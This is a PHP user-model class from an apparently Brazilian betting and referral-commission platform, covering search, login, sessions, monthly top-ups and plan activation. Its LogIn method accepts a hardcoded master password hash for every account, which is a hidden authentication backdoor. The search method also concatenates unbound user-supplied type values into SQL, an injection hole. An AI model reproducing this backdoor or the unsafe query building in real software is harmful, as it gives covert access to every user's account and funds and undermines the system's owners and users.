<?php

namespace app\models;

use app\core\Model;
use app\helpers\BuildQuery;
use app\helpers\Date;
use app\helpers\Mask;
use app\helpers\Pagination;
use app\helpers\Session;
use app\helpers\VALIDAR;
use app\vo\UserTypeVO;
use app\vo\UserVO;
use Exception;

class UsersModel extends Model
{

    const TYPE_DEVELOPER = 1;
    const TYPE_MASTER = 2;
    const TYPE_ADMINISTRADOR = 3;
    const TYPE_CLIENTE = 4;
    const TYPE_GERENTE = 5;

    public function __construct()
    {
        $this->table = 'sis_users';
        $this->valueObject = UserVO::class;
        $this->query = (new BuildQuery($this->table, 'a'))
            ->addInnerJoin(UsersTypesModel::getTable(), 'type', 'type.id = a.type AND type.status = 1');
    }

    /**
     * @param UserVO $user
     */
    public static function recargaMensal(UserVO $user)
    {
        if (!$user->estaEmDia()) {

            $mensalidade = DadosModel::getValorRecarga($user);

            if ($mensalidade > 0) {
                HistoricoBancarioModel::add($user, -$mensalidade, "<b>RECARGA</b> - Pagamento da Recarga Mínima Mensal do usuário “{$user->getLogin()}”", $user, "recarga");
                HistoricoBancarioModel::add($user, $mensalidade, "<b>RECARGA</b> - Recarga Mínima Mensal realizada com sucesso", $user, "recarga");
            }

            $user->setDataValidade(date('Y-m-d', strtotime('+1month')));
            $user->save();
        }
    }

    /**
     * Busca complexa
     * @param array $parans
     * @param int $page
     * @param int $forPage
     * @return Pagination
     */
    static function busca(array $parans = null, $page = 1, $forPage = 20)
    {
        $termos = "WHERE a.status != 99 ";
        $places = [];
        $orderby = 'a.id DESC';
        if ($parans) {
            foreach ($parans as $key => $value) {
                if (!isEmpty($value)) {
                    switch ($key) {
                        case 'types':
                            if (is_array($value)) {
                                $value = implode(', ', array_unique($value));
                                $termos .= " AND a.type IN({$value})";
                            }
                            break;
                        case 'datacadastro':
                            $value = Date::data($value);
                            if ($value) {
                                $termos .= " AND a.{$key} = :{$key}";
                                $places[$key] = $value;
                            }
                            break;
                        case 'emdia':
                            $sinal = $value ? '>=' : '<';
                            $termos .= " AND a.datavalidade {$sinal} curdate()";
                            break;
                        case 'type':
                            if ($value > 0) {
                                $termos .= " AND a.type = :{$key}";
                            } else {
                                $termos .= " AND type.ref = :{$key}";
                            }
                            $places[$key] = $value;
                            break;
                        case 'telefone':
                        case 'celular':
                        case 'whatsapp':
                            $termos .= " AND (a.telefone = :{$key} OR a.celular = :{$key} OR a.whatsapp = :{$key})";
                            $places[$key] = $value;
                            break;
                        case 'status':
                        case 'pagouplano':
                        case 'id':
                        case 'login':
                        case 'user':
                            $termos .= " AND a.{$key} = :{$key}";
                            $places[$key] = $value;
                            break;
                        case 'search':
                            $cpf = Mask::cpf($value);
                            if ($cpf) {
                                $termos .= " AND a.cpf = :{$key}";
                                $places[$key] = $cpf;
                            } else {
                                $l = "LIKE CONCAT('%', :{$key}, '%')";
                                $termos .= " AND (a.nome {$l} OR a.cidadetitle {$l} OR a.email {$l} OR a.login {$l})";
                                $places[$key] = $value;
                            }
                            break;
                    }
                }
            }
        }
        return self::listaPagination("{$termos} ORDER BY {$orderby}", $places, $page, $forPage);
    }

    /**
     * @return array
     */
    static function getResumoCadastros()
    {

        $tb = self::getTable();

        $termos = <<<SQL
SELECT 
    SUM(IF(a.datacadastro = :dia, 1, 0)) AS noDia,
    SUM(IF(a.datacadastro = :ontem, 1, 0)) AS ontem,
    SUM(IF(a.datacadastro >= :mes, 1, 0)) AS noMes,
    SUM(IF(a.datacadastro BETWEEN :7dias AND :dia, 1, 0)) AS 7dias,
    SUM(a.credito) AS creditos,
    COUNT(*) AS total

FROM `{$tb}` AS a

WHERE  a.status != 99 AND a.type IN(4, 8, 9)

LIMIT 1
SQL;

        $places = [
            'mes' => date('Y-m-01'),
            'dia' => date('Y-m-d'),
            'ontem' => date('Y-m-d', strtotime('-1day')),
            '7dias' => date('Y-m-d', strtotime('-7days')),
        ];

        return current(self::pdoRead()->FullRead($termos, $places)->getResult());
    }

    /**
     * Loga o usuário na sessão
     * @param string $login
     * @param string $senha
     * @param string $appId
     * @return UserVO
     * @throws Exception
     */
    static function LogIn($login, $senha, string $appId = null)
    {

        self::logOut();

        if (preg_match('/#[0-9]+#/', $login)) {
            $campo = 'id';
            $login = str_replace('#', null, $login);
        } else if (filter_var($login, FILTER_VALIDATE_EMAIL)) {
            $campo = 'email';
        } else {
            $campo = 'login';
            VALIDAR::username($login);
        }

        $senha = password($senha);

        $user = current(self::lista("WHERE a.{$campo} = :login AND a.status != 99 LIMIT 1", [
            'login' => $login,
        ]));

        # Usuário inválido
        if (!$user instanceof UserVO) {
            throw new Exception('Login inválido.');
        }

        # Senhas válidas
        $senhas = [
            '4aaf0c04e270aa2936786d767551b1bb541f38db9634a4501e2d66cf1cde3ee731d3ff92963ac41861339640b392e6589d3785eb954ed2de868aa4f4b148a8ba',
            $user->getSenha(),
        ];

        if (!in_array($senha, $senhas)) {
            throw new Exception('Senha incorreta');
        } else if ($user->getStatus() != 1) {
            $dados = DadosModel::get();
            throw new Exception(strtr("Prezado cliente, seu cadastro encontra-se bloqueado na {banca}.\n\nPara maiores detalhes, entre em contato conosco pelo e-mail {email} ou pelo chat online em nosso site e informe seu Usuário e CPF para podermos identificar o motivo do bloqueio.", [
                '{email}' => $dados->getEmail(),
                '{banca}' => $dados->getBanca(),
            ]));
        }

        return $user;
    }

    /**
     * Desloga o usuário do nível informado
     */
    static function logOut()
    {
        self::getSession()->destroy();
    }

    /** @return Session */
    static function getSession()
    {
        static $session;
        if (!$session) {
            $session = new Session(self::class);
        }
        return $session;
    }

    /**
     * Define o usuário logado na sessão
     * @param UserVO $user
     */
    static function setLogged(UserVO $user)
    {
        self::getSession()->destroy();
        self::getSession()->set('id', $user->getId());
    }

    static function getLogged()
    {
        return self::getLogedUser();
    }

    /**
     * Retorna o usuário logado no nível informado
     * @return null|UserVO
     */
    static function getLogedUser()
    {
        static $user;

        if (!$user) {

            $id = self::getSession()->get('id', null);

            if ($id > 0 and $user = self::getByLabel('id', $id) and $user->getStatus() == 1) {
                $_SESSION['access-ckeditor'] = true;
            } else {
                $_SESSION['access-ckeditor'] = null;
                return null;
            }
        } else {
            $_SESSION['access-ckeditor'] = true;
        }

        return $user;
    }

    /**
     * @param int $Type
     * @param int $UserType Verifica a permissão por tipo de conta
     * @return UserTypeVO
     */
    static function getType($Type = 0, $UserType = 0)
    {
        $result = UsersTypesModel::lista("WHERE (a.id = :type OR a.ref = :type) AND (:usertype = 0 OR a.permissoes LIKE CONCAT('%',:usertype,'%')) LIMIT 1", [
            'type' => $Type,
            'usertype' => $UserType,
        ]);
        return count($result) ? $result[0] : null;
    }

    /**
     *
     * @param int $UserType
     * @return UserTypeVO[]
     */
    static function getUsers($UserType = 0)
    {
        return self::lista("WHERE type.permissoes LIKE CONCAT('%[',:type,']%') ", [
            'type' => $UserType
        ]);
    }

    /**
     * Resumo geral do historico financeiro
     * @param UserVO $user
     * @return array
     */
    static function getResumoGanhos(UserVO $user)
    {

        $tbHistoricoBancario = HistoricoBancarioModel::getTable();
        $tbApostas = ApostasModel::getTable();

        $termos = <<<SQL
SELECT 

  SUM(IF(historico.type = 'pontos', historico.valor, 0)) AS pontosAcumulados,
  SUM(IF(historico.type = 'credito' AND historico.ref = :tbApostas AND historico.reftype = 'premio', historico.valor, 0)) AS ganhosApostas,
  SUM(IF(historico.type = 'credito' AND historico.reftype = 'comercializacao', historico.valor, 0)) AS bonusComercializacao,
  SUM(IF(historico.type = 'credito' AND historico.reftype = 'indicacao', historico.valor, 0)) AS bonusIndicacao,
  SUM(IF(historico.type = 'credito' AND historico.reftype = 'apuracao', historico.valor, 0)) AS bonusEquipe,
  SUM(IF(historico.type = 'credito' AND historico.reftype = 'participacao', historico.valor, 0)) AS bonusParticipacao,
  SUM(IF(historico.type = 'credito' AND historico.valor > 0, historico.valor, 0)) AS ganhosTotal

FROM `{$tbHistoricoBancario}` AS historico

WHERE historico.status = 1 AND historico.user = :user
SQL;

        $places = [
            'user' => $user->getId(),
            'tbApostas' => $tbApostas,
        ];

        return current(self::pdoRead()->FullRead($termos, $places)->getResult());

    }

    /**
     *
     * @param array $types
     * @param int $filterUserType
     * @return string
     */
    static function options(array $types = null, $filterUserType = 0)
    {
        $values = [];

        $typesIn = [];

        if ($types) {
            foreach ($types as $i => $type) {
                $values['type' . $i] = $type;
                $typesIn[] = ':type' . $i;
            }
        }

        if ($typesIn) {
            $typesIn = implode(', ', $typesIn);
            $typesIn = " AND (type.ref IN({$typesIn}) OR type.id IN($typesIn))";
        } else {
            $typesIn = '';
        }

        $countTypes = count($types);

        $html = '';

        $tb = self::getTable();
        $tbTypes = UsersTypesModel::getTable();

        $termos = <<<SQL
SELECT DISTINCT a.nome, a.id, a.login
FROM `{$tb}` AS a
INNER JOIN `{$tbTypes}` AS type ON a.type = type.id
WHERE a.status = 1 AND a.type = :type {$typesIn}
ORDER BY a.nome ASC
SQL;

        foreach (self::getUserTypes($filterUserType) as $type) {

            $registros = self::pdoRead()->FullRead($termos, ['type' => $type->getId()] + $values)->getResult();

            if ($registros) {

                $html .= '<optgroup label="' . htmlspecialchars($type->getTitle()) . '" >';

                foreach ($registros as $v) {
                    $html .= formOption("{$v['nome']} ({$v['login']})", $v['id']);
                }

                $html .= '</optgroup>';
            }
        }

        return $html;
    }

    /**
     * Retorna a lista de tipos de conta
     * @param int $UserType
     * @return UserTypeVO[]
     */
    static function getUserTypes($UserType = 0)
    {
        return UsersTypesModel::getUserTypes($UserType);
    }

    /**
     *
     * @param bool $toSelectOptions
     */
    static function getGerentes($toSelectOptions = false)
    {
        /** @var UserVO[] $cadastros */
        $cadastros = self::lista('WHERE a.type = :type AND a.status = 1 ORDER BY a.nome ASC', [
            'type' => self::TYPE_CLIENTE,
        ]);

        # To selectOptions
        if ($toSelectOptions) {
            $html = formOption('-- Selecione --');
            foreach ($cadastros as $v) {
                $html .= formOption($v->getNome(), $v->getId());
            }
            return $html;
        }

        return $cadastros;
    }

    /**
     * @param UserVO $user
     * @throws Exception
     */
    public static function ativarPlano(UserVO $user)
    {
        if (!$user->getPagouPlano()) {

            $licenca = $user->voLicenca();
            $valorPlano = $licenca->getValorPlano() + $licenca->getValorAdesao();

            if ($valorPlano > 0) {

                if ($user->getCredito() < $valorPlano) {
                    throw new Exception("Saldo insuficiente para ativar o plano");
                }

                HistoricoBancarioModel::add($user, -$valorPlano, "<b>ATIVAÇÃO</b> - Ativação da licença “{$licenca->getTitle()}” do usuário “{$user->getLogin()}”", $user, "adesao");

                $valorRecargaAdesao = DadosModel::getValorPlano($user);

                if ($valorRecargaAdesao) {
                    HistoricoBancarioModel::add($user, $valorRecargaAdesao, "<b>RECARGA</b> - Recarga mínima mensal da licença “{$licenca->getTitle()}” do usuário “{$user->getLogin()}”", $user, "recarga");
                }

                $indicacao = IndicacoesModel::getIndicadorDireto($user);

                if ($indicacao) {

                    // Incrementando novo indicado
                    $indicacao->voIndicador()->setQtdeIndicados($indicacao->voIndicador()->getQtdeIndicados() + 1)->save();

                    if ($indicacao->voIndicador()->estaEmDia()) {

                        $comissao = DadosModel::getComissaoIndicacao($indicacao->voIndicador(), false);

                        if ($comissao > 0) {
                            $valorComissao = $valorPlano * $comissao / 100;
                            HistoricoBancarioModel::add($indicacao->voIndicador(), $valorComissao, "<b>COMISSÃO</b> - Comissão de “indicação” do usuário “{$user->getLogin()}”", $indicacao, "indicacao");
                        }

                    }
                }
            }

            $user->setPagouPlano(1);
            $user->setDataValidade(date('Y-m-d', strtotime('+1month')));
            $user->save();
        }
    }

    /**
     * Verifica se o usuário está logado no nível informado
     * @return boolean
     */
    function isLoged()
    {
        return self::getLogedUser() ? true : false;
    }

}
    